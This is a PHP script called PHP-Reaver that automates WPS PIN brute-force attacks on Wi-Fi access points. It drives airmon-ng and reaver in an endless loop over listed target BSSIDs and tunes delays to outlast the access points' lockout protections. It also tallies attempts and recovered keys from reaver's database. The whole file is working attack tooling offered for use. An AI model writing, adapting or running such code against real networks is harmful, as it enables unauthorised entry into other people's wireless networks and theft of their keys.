<?php

class PHPReaver {

	// Specify the WiFi adapters as the keys for $bssids and set the value as an array of BSSID's you want to test via that adapter

	private $bssids = array(
		'wlan0'=>array(
			'00:11:22:33:44:55',
		),
		/*'wlan1'=>array(
			'00:11:22:33:44:55',
		),
		'wlan2'=>array(
			'00:11:22:33:44:55',
		),*/
	);

	private $reaver = array(
		'path_database'			=> '/usr/local/etc/reaver/reaver.db', // Path to reaver SQLite Database
		'path_resume'			=> '/usr/local/etc/reaver/', // Path to session files
		'delay'					=> 8, // -d, --delay=<seconds> Set the delay between pin attempts
		'timeout'				=> 30, // -t, --timeout=<seconds> Set the receive timeout period
		'max_attempts'			=> 1, // -g, --max-attempts=<num> Quit after num pin attempts
		'lock_delay' 			=> 218, // -l, --lock-delay=<seconds> Set the time to wait if the AP locks WPS pin attempts
		'additional_arguments' 	=> '-N -T 30' // Any additional arguments you want to pass to reaver
	);

	private $config = array(
		'sleep_loop'		=> 1800, // Delay in seconds after each loop of all BSSID's and WiFi adapters
		'sleep_bssid'		=> 5, // Delay in seconds between testing each BSSID
		'timeout_command'	=> 218, // Timeout in seconds, if reaver has not finished within this time period it will be killed and the next bssid will be tested.
		'output'			=> 'output-phpreaver.txt', // File to write PHP-Reaver and Reaver output to.
		'filter_stats'		=> true //only show the bssid's specified above when showing the progress stats. Setting this to false will show all bssid's in the reaver.db
	);


	private $banner = '
*--------------------------------*
|       ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄      |
|      █  ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▄  █     |
|      █ █ ▀     ▀  ▀    █ █     |
|      █ █        ▄▀▀▄ ▀ █ █▄▀▀▄ |
|█▀▀█▄ █ █  ▀     █   ▀▄▄█▄▀   █ |
|▀▄▄ ▀██ █▄ ▀   ▄▄▀            ▀▄|
|  ▀█▄▄█ █    ▄  █   ▄█   ▄ ▄█  █|
|     ▀█ ▀▄▀     █ ██ ▄  ▄  ▄ ███|
|     ▄█▄  ▀▀▀▀▀▀▀▀▄  ▀▀▀▀▀▀▀ ▄▀ |
|    █  ▄█▀█▀▀█▀▀▀▀▀▀█▀▀█▀█▀▀█   |
|    ▀▀▀▀  ▀▀▀        ▀▀▀  ▀▀    |
*--------- NYAN CAT FTW ---------*
';

	// Leave these variables as they are

	private $version = '0.2';

	private $_log_fh = null;

	private $_ifaces = array();

	private $_stats = array();

	private $_start_time = 0;

	private $_loop_start_time = 0;

	private $_last_loop_duration = 0;

	private $_loop_durations = array();

	private $_bssid_count = 0;

	private $_loop_count = 0;

	function __construct() {

		$this->_start_time = time();

		foreach( $this->bssids as $iface => $bssids ) $this->_bssid_count += count( $bssids );

		$this->_log_fh = fopen( $this->config['output'], 'a' ) or $this->quit( 'Can\'t open output file' );

		foreach( array_keys( $this->bssids ) as $iface ) $this->_ifaces[ $iface ] = '';

		if( $this->banner != '' ) $this->log( $this->banner );

		$this->log( 'Starting PHP-Reaver v' . $this->version . ' at ' . $this->time() );

		$this->log_stats();

		while( 1 ) $this->main_loop();
		
	}

	private function main_loop() {

		$this->_loop_count++;

		$this->_loop_start_time = time();//$this->time();

		$this->log( 'Loop started at ' . $this->time() );

		$this->log( 'Killing any running reaver processes' );

		exec( 'killall -9 reaver' );

		foreach( $this->bssids as $iface => $bssids ) {

			if( $this->restart_interface( $iface ) ) {

				foreach($bssids as $bssid) $this->try_pin( $bssid, $iface );

			} else {

				$this->quit( 'Could not restart interface ' . $iface );

			}

		}

		$this->_last_loop_duration = time() - $this->_loop_start_time;

		$this->_loop_durations[] = $this->_last_loop_duration;

		$this->log( 'Loop finished at ' . $this->time() );

		$this->log_stats();

		if( $this->config['sleep_loop'] > 0 ) {

			$this->log( 'Sleeping for ' . $this->duration( $this->config['sleep_loop'] ) );
			sleep( $this->config['sleep_loop'] );

		}

	}

	private function try_pin( $bssid, $iface ) {

		$this->log( 'Trying BSSID ' . $bssid . ' on interface ' . $iface . ' / ' . $this->_ifaces[ $iface ] . ' at ' . $this->time() );

		$resume_file = $this->reaver['path_resume'] . str_replace( ':', '', $bssid ) . '.wpc';

		$this->log( 'Resume file: ' . $resume_file );

		$cmd = 'timeout ' . $this->config['timeout_command'] . ' reaver -i ' . $this->_ifaces[ $iface ] . ' -b ' . $bssid . ' -d ' . $this->reaver['delay'] . ' -t ' . $this->reaver['timeout'] . ' -g ' . $this->reaver['max_attempts'] . ' -l ' . $this->reaver['lock_delay'] . ' -s ' . $resume_file . ' -o ' . $this->config['output'] . ' -vv ' . $this->reaver['additional_arguments'];

		$response = array();
		exec( $cmd, $response ); //the actual output is sent to the output log file, we just capture the response to stop reaver echoing it's banner into the terminal

		$this->log( 'Finished pin attempt for ' . $bssid . ' at ' . $this->time() );

		if( $this->config['sleep_bssid'] > 0 ) {

			$this->log( 'Sleeping for a ' . $this->duration( $this->config['sleep_bssid'] ) );
			sleep( $this->config['sleep_bssid'] );

		}

	}

	private function restart_interface( $iface ) {

		if( isset( $this->_ifaces[ $iface ] ) && $this->_ifaces[ $iface ] != '' ) {

			$stopped = false;

			$this->log( 'Stopping ' . $this->_ifaces[ $iface ] );

			$response = array();
			exec( 'airmon-ng stop '.$this->_ifaces[ $iface ], $response );

			foreach( $response as $line ) {

				$line = trim( str_replace( "\t", '', $line ) );
				$bits = explode( ' ', $line );

				if( trim( $bits[ count( $bits ) - 1 ] ) == '(removed)' ) {

					$stopped = true;
					break;

				}

			}

			if( !$stopped )
				$this->log( 'Could not stop ' . $this->_ifaces[ $iface ] );

		}

		$this->log( 'Starting interface ' . $iface );

		$response = array();
		exec( 'airmon-ng start ' . $iface, $response );

		foreach( $response as $line ) {

			$line = trim( str_replace( array( "\t", '(', ')' ), '', $line ) );

			if( strpos( $line, 'monitor mode enabled on' ) !== false ) {

				$bits = explode( ' ', $line );

				$mon = trim( $bits[ count( $bits ) - 1 ] );

				if( $mon != '' ) {

					$this->_ifaces[ $iface ] = $mon;
					$this->log( 'Started ' . $iface . ' on ' . $this->_ifaces[ $iface ] );
					return true;

				} else {

					$this->quit( 'Could not start interface ' . $iface );

				}
				
			}

		}

		return false;

	}

	private function log_stats() {

		$this->log();

		$this->log( 'Reaver Stats' );
		$this->log( '============' );

		$this->log();

		$db = new SQLite3( $this->reaver['path_database'] );

		$this->log( $this->pad( 'essid' ) . $this->pad( 'bssid', 20 ) . $this->pad( 'attempts', 24 ) . $this->pad( 'key', 1 ) );

		$results = $db->query( 'SELECT * FROM history ORDER BY attempts DESC' );

		while ( $row = $results->fetchArray() ) {

			$attempts = $row['attempts'];

			$show = false;

			if( $this->config[ 'filter_stats' ] === true ) {

				foreach( $this->bssids as $iface => $bssids )
					if( in_array( $row[ 'bssid' ], $bssids ) )
						if( $show = true ) break;

			} else {

				$show = true;

			}

			if( $show === true ) {

				if( !isset( $this->_stats[ $row[ 'bssid' ] ] ) ) {

					$this->_stats[ $row[ 'bssid' ] ] = $attempts;

					$attempts = $this->pad( $attempts, 17 );

				} else {

					$diff = $attempts - $this->_stats[ $row[ 'bssid' ] ];
					if($diff > 0) $attempts = $this->pad( $attempts, 6) . $this->pad( '( +' . $diff . ' )', 11 ); //11
					else $attempts = $this->pad( $attempts, 17 );

				}

				if( $row['attempts'] > 0 ) 
					$attempts .= $this->pad( $this->percent( $row['attempts'], 11000 ), 4 );

				$this->log( $this->pad( $row['essid'] ) . $this->pad( $row['bssid'], 20 ) . $this->pad( $attempts, 24 ) . $this->pad( $row['key'], 1 ) );

			}


		}

		$this->log();

		$this->log( 'PHP-Reaver Stats' );
		$this->log( '================' );

		$this->log();

		$this->log( 'BSSIDs: ' . $this->_bssid_count );
		$this->log( 'Started: ' . $this->time() );

		if( $this->_loop_count > 0 ) {

			$avg = 0;

			foreach($this->_loop_durations as $time )
				$avg += $time;

			$avg = $avg / count( $this->_loop_durations );

			$this->log( 'Running for: ' . $this->duration( time() - $this->_start_time ) );
			$this->log( 'Loops: ' . $this->_loop_count );
			$this->log( 'Last loop took: ' . $this->duration( $this->_last_loop_duration ) );
			$this->log( 'Average loop time: ' . $this->duration( $avg ) );

		}

		$this->log();

	}

	private function time() {

		return date( 'Y-m-d g:i a', time() );

	}

	private function quit( $string = '' ) {

		$this->log( $string . ', Quitting...' );
		die( $string . ', Quitting...' );

	}

	private function log( $string = '' ) {

		fwrite( $this->_log_fh, '[#] ' . $string . "\n" );

	}

	private function pad( $string, $padding = 25 ) {
	
		$extra = $padding - strlen( $string );

		if( $extra > 0 ) for( $i=1; $i<=$extra; $i++ ) $string .= ' ';

		return $string;

	}

	private function duration( $duration = 0 ) {

	    $second = 1;
		$minute = 60*$second;
		$hour   = 60*$minute;
		$day    = 24*$hour;

		$days    = floor($duration/$day);
		$hours   = floor(($duration%$day)/$hour);
		$minutes = floor((($duration%$day)%$hour)/$minute);
		$seconds = floor(((($duration%$day)%$hour)%$minute)/$second);
		

	    $string = '';

	    if( (int) $days > 0 )
	    	$string .= (string) $days . ' days';

	    if( (int) $hours > 0 )
	    	$string .= ( $string != '' ? ', ':' ') . (string)$hours . ' hours';

	    if( (int) $minutes > 0 )
	    	$string .= ( $string != '' ? ', ':' ') . (string)$minutes . ' minutes';

	    if( (int) $seconds > 0 )
	    	$string .= ( $string != '' ? ', ':' ') . (string)$seconds . ' seconds';

	    if( $string == '' )
	    	$string = 'N/A';
	 
	    return trim($string);

	}

	private function percent( $small = 1, $large = 1 ) {

		return (string) round( $small / $large * 100, 2) . '%';

	}

}

$PHPReaver = new PHPReaver();